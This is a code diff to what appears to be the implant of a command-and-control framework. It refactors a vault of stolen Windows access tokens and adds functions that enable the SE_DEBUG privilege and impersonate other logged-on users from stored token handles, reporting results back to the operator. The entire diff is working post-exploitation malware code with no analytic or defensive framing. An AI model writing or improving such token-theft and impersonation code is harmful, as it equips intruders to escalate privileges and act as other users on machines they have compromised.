@@ -89,25 +89,14 @@ DWORD TokenAdd( HANDLE hToken, LPSTR DomainUser, SHORT Type, DWORD dwProcessID, 
     TokenList = Instance.Tokens.Vault;
 
     // add TokenEntry to Token linked list
-    do {
-
-        if ( TokenList )
-        {
-            if ( TokenList->NextToken != NULL )
-            {
-                TokenList = TokenList->NextToken;
-            }
-            else
-            {
-                TokenList->NextToken = TokenEntry;
-                break;
-            }
-        } else
-            break;
-
+    while ( TokenList->NextToken != NULL )
+    {
+        TokenList = TokenList->NextToken;
         TokenIndex++;
+    }
 
-    } while ( TRUE );
+    TokenList->NextToken = TokenEntry;
+    TokenIndex++;
 
     return TokenIndex;
 }
@@ -202,6 +191,9 @@ BOOL TokenRemove( DWORD TokenID )
         PUTS( "Its first item" )
         TokenItem = Instance.Tokens.Vault->NextToken;
 
+        if ( Instance.Tokens.Impersonate && Instance.Tokens.Token->Handle == Instance.Tokens.Vault->Handle )
+            TokenImpersonate( FALSE );
+
         if ( Instance.Tokens.Vault->Handle )
         {
             Instance.Win32.NtClose( Instance.Tokens.Vault->Handle );
@@ -236,12 +228,8 @@ BOOL TokenRemove( DWORD TokenID )
             Instance.Tokens.Vault->lpPassword = NULL;
         }
 
-        if ( Instance.Tokens.Vault )
-        {
-            MemSet( Instance.Tokens.Vault, 0, sizeof( TOKEN_LIST_DATA ) );
-            Instance.Win32.LocalFree( Instance.Tokens.Vault );
-            Instance.Tokens.Vault = NULL;
-        }
+        MemSet( Instance.Tokens.Vault, 0, sizeof( TOKEN_LIST_DATA ) );
+        Instance.Win32.LocalFree( Instance.Tokens.Vault );
 
         Instance.Tokens.Vault = TokenItem;
 
@@ -257,6 +245,9 @@ BOOL TokenRemove( DWORD TokenID )
                 PUTS( "Found TokenItem" )
 
                 TokenList->NextToken = TokenItem->NextToken;
+
+                if ( Instance.Tokens.Impersonate && Instance.Tokens.Token->Handle == TokenItem->Handle )
+                    TokenImpersonate( FALSE );
 
                 if ( TokenItem->Handle )
                 {
@@ -355,19 +346,11 @@ PTOKEN_LIST_DATA TokenGet( DWORD TokenID )
     PTOKEN_LIST_DATA TokenList  = Instance.Tokens.Vault;
     DWORD            TokenIndex = 0;
 
-    do
-    {
-        if ( TokenList != NULL )
-        {
-            if ( TokenID == TokenIndex )
-                break;
-            else
-                TokenList = TokenList->NextToken;
-        } else
-            break;
+    for (TokenIndex = 0; TokenIndex < TokenID && TokenList && TokenList->NextToken; ++TokenIndex)
+        TokenList = TokenList->NextToken;
 
-        TokenIndex++;
-    } while ( TRUE );
+    if ( TokenIndex != TokenID )
+        return NULL;
 
     return TokenList;
 }
@@ -376,6 +359,8 @@ VOID TokenClear()
 {
     PTOKEN_LIST_DATA TokenList  = Instance.Tokens.Vault;
     DWORD            TokenIndex = 0;
+
+    TokenImpersonate( FALSE );
 
     do {
         if ( TokenList != NULL )
@@ -393,18 +378,26 @@ VOID TokenClear()
     Instance.Tokens.Token       = NULL;
 }
 
-VOID TokenImpersonate( BOOL Impersonate )
+BOOL TokenImpersonate( BOOL Impersonate )
 {
-    if ( Impersonate && Instance.Tokens.Token )
+    if ( Impersonate && ! Instance.Tokens.Impersonate && Instance.Tokens.Token )
     {
         // impersonate the current token.
         if ( Instance.Win32.ImpersonateLoggedOnUser( Instance.Tokens.Token->Handle ) )
             Instance.Tokens.Impersonate = TRUE;
         else
             Instance.Tokens.Impersonate = FALSE;
+
+        return Instance.Tokens.Impersonate;
     }
-    else
-        Instance.Win32.RevertToSelf();
+    else if ( ! Impersonate && Instance.Tokens.Impersonate )
+        return Instance.Win32.RevertToSelf(); // stop impersonating
+    else if ( Impersonate && ! Instance.Tokens.Token )
+        return TRUE; // there is no token to impersonate in the first place
+    else if ( Impersonate && Instance.Tokens.Impersonate )
+        return TRUE; // we are already impersonating
+    else if ( ! Impersonate && ! Instance.Tokens.Impersonate )
+        return TRUE; // we are already not impersonating
 }
 
 LPWSTR GetObjectInfo( HANDLE hObject, OBJECT_INFORMATION_CLASS objInfoClass )
@@ -786,4 +779,79 @@ Cleanup:
         Instance.Win32.LocalFree( pProcessInfoList );
 
     return ReturnValue;
+}
+
+BOOL ImpersonateTokenFromVault( DWORD TokenID )
+{
+    PTOKEN_LIST_DATA TokenData = NULL;
+    BOOL             Success   = FALSE;
+
+
+    TokenData = TokenGet( TokenID );
+
+    if ( ! TokenData )
+    {
+        PUTS( "Token not found in vault." )
+        PackageTransmitError( CALLBACK_ERROR_TOKEN, 0x1 );
+        goto Cleanup;
+    }
+
+    if ( ! ImpersonateTokenInStore( TokenData ) )
+        goto Cleanup;
+
+    Success = TRUE;
+
+Cleanup:
+    return Success;
+}
+
+BOOL ImpersonateTokenInStore( PTOKEN_LIST_DATA TokenData )
+{
+    BOOL Success = FALSE;
+
+    if ( ! TokenData )
+        goto Cleanup;
+
+    // if we are already impersonating the selected token, do nothing
+    if ( Instance.Tokens.Impersonate && TokenData->Handle == Instance.Tokens.Token->Handle )
+        return TRUE;
+
+    if ( ! TokenSetPrivilege( SE_DEBUG_NAME, TRUE ) )
+    {
+        PUTS( "Could not enable SE_DEBUG_NAME privilege." )
+        goto Cleanup;
+    }
+
+    if ( ! Instance.Win32.RevertToSelf() )
+    {
+        CALLBACK_GETLASTERROR
+        goto Cleanup;
+    }
+
+    if ( Instance.Win32.ImpersonateLoggedOnUser( TokenData->Handle ) )
+    {
+        Instance.Tokens.Impersonate = TRUE;
+        Instance.Tokens.Token       = TokenData;
+
+        PRINTF( "[+] Successfully impersonated: %s\n", TokenData->DomainUser );
+    }
+    else
+    {
+        Instance.Tokens.Impersonate = FALSE;
+        Instance.Tokens.Token       = NULL;
+
+        PRINTF( "[!] Failed to impersonate token user: %s\n", TokenData->DomainUser );
+
+        CALLBACK_GETLASTERROR
+
+        if ( ! Instance.Win32.RevertToSelf() )
+            CALLBACK_GETLASTERROR
+
+        goto Cleanup;
+    }
+
+    Success = TRUE;
+
+Cleanup:
+    return Success;
 }
